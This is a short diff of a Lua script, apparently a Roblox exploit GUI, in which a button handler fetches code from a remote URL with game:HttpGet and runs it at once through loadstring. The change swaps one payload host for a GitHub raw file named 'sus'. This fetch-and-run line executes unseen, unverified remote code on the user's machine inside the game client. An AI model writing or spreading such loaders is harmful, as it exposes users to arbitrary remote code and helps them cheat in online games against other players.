@@ -88,5 +88,5 @@ drgbloxSection:NewButton("forgotthename", "work", function()
 end)
 
 drgbloxSection:NewButton("fortheultimateblox", "itsly", function()
-    loadstring(game:HttpGet("https://robloxhubop.ml/raw/leranebimu"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ajilahcoeg/sussy/main/sus"))()
 end)
